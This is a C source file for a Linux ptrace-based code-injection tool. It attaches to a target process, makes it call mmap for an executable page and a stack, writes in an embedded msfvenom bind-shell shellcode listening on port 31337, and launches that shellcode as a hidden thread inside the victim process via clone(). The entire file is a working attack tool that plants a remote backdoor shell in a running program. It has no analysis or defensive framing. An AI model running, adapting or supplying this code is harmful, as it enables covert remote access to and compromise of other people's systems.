#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <string.h>
#include <stdarg.h> 
#include <sched.h>

// msfvenom -p linux/x64/shell_bind_tcp LPORT=31337 -f c
const unsigned char payload[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x7a\x69\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";


unsigned long swap_u64(unsigned long x)
{
	x =       (x>>56) |
	((x<<40) & 0x00FF000000000000) |
	((x<<24) & 0x0000FF0000000000) |
	((x<<8)  & 0x000000FF00000000) |
	((x>>8)  & 0x00000000FF000000) |
	((x>>24) & 0x0000000000FF0000) |
	((x>>40) & 0x000000000000FF00) |
	(x<<56);
	return x;
}          

void usage()
{
	printf("Usage: inject <pid>\n");
	exit(1);
}

void bailout(char * errstr) 
{
	fprintf(stderr, "OMG NOOO! Failure at : %s\n", errstr);
	exit(1);
}

void dump_regs(struct user_regs_struct * regs)
{
	printf("rax=%016llx rbx=%016llx rcx=%016llx rdx=%016llx rsi=%016llx rdi=%016llx\n", regs->rax, regs->rbx, regs->rcx, regs->rdx, regs->rsi, regs->rdi);
	printf("rip=%016llx rsp=%016llx rbp=%016llx\n", regs->rip, regs->rsp, regs->rbp);
}

int ptrace_swapmem(const pid_t pid, const void * base_addr, 
	const void * newmem, void * oldmem, const size_t num_words)
{
	int i;
	unsigned long * addr    = (unsigned long *)base_addr;
	unsigned long * src       = (unsigned long *)newmem;
	unsigned long * dst      = (unsigned long *)oldmem;
	unsigned long orig;
	
	for(i = 0; i < num_words; i++) {
		orig = ptrace(PTRACE_PEEKTEXT, pid, addr, NULL);
		if (errno)
			bailout("PTRACE_PEEKTEXT");
	   
		if (ptrace(PTRACE_POKETEXT, pid, addr, *src))
			bailout("PTRACE_POKETEXT");

		printf("        patching: %016llx : %016llx => %016llx\n", addr, swap_u64(orig), swap_u64(*src));

		addr++;
		src++;
		if (oldmem > 0) {
			*dst = orig;
			dst++;
		}
	}
}

unsigned long ptrace_inject_code(pid_t pid, void * code_ptr, 
	int n_code_words, int n_instructions, 
	struct user_regs_struct * regs_in, 
	struct user_regs_struct * regs_out) 
{
	struct user_regs_struct regs_bak;	
	char origmem[8];
	int waitstatus;
	void * patch_rip;
	int i;
			
	ptrace(PTRACE_GETREGS, pid, NULL, &regs_bak);
	
	patch_rip = (void *)regs_bak.rip;
	printf("    executing %d instruction(s), rip=%p\n", n_instructions, patch_rip);

	ptrace_swapmem(pid, patch_rip, code_ptr, origmem, n_code_words);
	ptrace(PTRACE_SETREGS, pid, NULL, regs_in);
	
	for (i = 0; i < n_instructions; i++) {
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL))
			bailout("PTRACE_SINGLESTEP");
			
		wait(&waitstatus);
		if (WIFSTOPPED(waitstatus)) {
			if (WSTOPSIG(waitstatus) != SIGTRAP) {
			   bailout("received unexpected signal...");
			}
		}
	}

	// return result state
	if (ptrace(PTRACE_GETREGS, pid, NULL, regs_out)) {
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
		bailout("PTRACE_GETREGS");
	}

	printf("    restoring original program state\n", n_instructions, patch_rip);
	// restore original mem/registers
	ptrace_swapmem(pid, patch_rip, origmem, NULL, 1);
	ptrace(PTRACE_SETREGS, pid, NULL, &regs_bak);
}

unsigned long ptrace_invoke_syscall(pid_t pid, long syscall_num, int n_args, ...)
{
	struct user_regs_struct regs_in;
	struct user_regs_struct regs_out;
		
	const char syscall[] = {
		0x0f, 0x05,								// syscall
		0xc3,									// ret
		0x90, 0x90, 0x90, 0x90, 0x90		  	// nop... (just to fill wordsize)
	};
	
	va_list ap;

	ptrace(PTRACE_GETREGS, pid, NULL, &regs_in);

	regs_in.rax = syscall_num;
	va_start(ap, n_args);
	if (n_args-- > 0) regs_in.rdi = va_arg(ap, long);
	if (n_args-- > 0) regs_in.rsi = va_arg(ap, long);
	if (n_args-- > 0) regs_in.rdx = va_arg(ap, long);
	if (n_args-- > 0) regs_in.r10 = va_arg(ap, long);
	if (n_args-- > 0) regs_in.r8  = va_arg(ap, long);
	if (n_args-- > 0) regs_in.r9  = va_arg(ap, long);

	ptrace_inject_code(pid, (void *)syscall, 1, 1, &regs_in, &regs_out);
	
	return regs_out.rax;
}

int main(int argc, char ** argv)
{
	void * mem_payload;
	void * mem_stack;
	void * stack_ptr;
	void * tmp_payload;
	const size_t tmp_payload_size = sizeof(payload) + sizeof(void *);
	
	pid_t pid;
	
	long parent_tid, child_tid;
	
	if (argc < 2)
		usage();

	pid = atoi(argv[1]);
	
	printf("[*] Attaching to process ...\n");
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
		bailout("PTRACE_ATTACH");

	if (waitpid(pid, 0, WSTOPPED) == -1)
		bailout("WAITPID");

	printf("[*] Allocating payload page ...\n");
	// mmap(addr, size, prot, flags, fd, offset)
	mem_payload = (void *)ptrace_invoke_syscall(pid, 9, 6, 0, PAGE_SIZE, (PROT_READ | PROT_EXEC), (MAP_PRIVATE | MAP_ANONYMOUS), -1, 0);
	printf("[*] Allocated payload page: %p\n", mem_payload);
	
	// load payload
	printf("[*] Loading payload ...\n");
	tmp_payload = malloc(tmp_payload_size);      
	memset(tmp_payload, '\x90', tmp_payload_size);
	memcpy(tmp_payload, payload, sizeof(payload) - 1);
	ptrace_swapmem(pid, mem_payload, tmp_payload, NULL, (sizeof(payload) / sizeof(void *) + 1));
	free(tmp_payload);

	printf("[*] Allocating stack page ...\n");
	// allocate thread stack
	mem_stack = (void *)ptrace_invoke_syscall(pid, 9, 6, 0, PAGE_SIZE, (PROT_READ | PROT_WRITE), (MAP_PRIVATE | MAP_ANONYMOUS), -1, 0);
	printf("[*] Allocated stack page  : %p\n", mem_stack);

	// stack pointer to highest address in stack page
	stack_ptr = (mem_stack + PAGE_SIZE) - sizeof(void *);
		
	// put payload address as return address on thread stack
	printf("[*] Initializing thread stack ...\n");
	ptrace_swapmem(pid, stack_ptr, &mem_payload, NULL, 1);
	
	// clone(clone_flags, newsp, parent_tid, child_tid)
	printf("[*] Executing clone() ...\n");
	unsigned long clone_flags = CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_PARENT | CLONE_THREAD | CLONE_IO;
	if ((long)ptrace_invoke_syscall(pid, 56, 4,	clone_flags, stack_ptr, &parent_tid, &child_tid) == -1) {
		bailout("clone syscall");
		ptrace(PTRACE_DETACH, pid, NULL, NULL);
	}
	
	printf("[*] Releasing process\n");
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
		
	printf("[*] DONE! y3r c0d3 sh4|| n0w rUn ...\n");
}

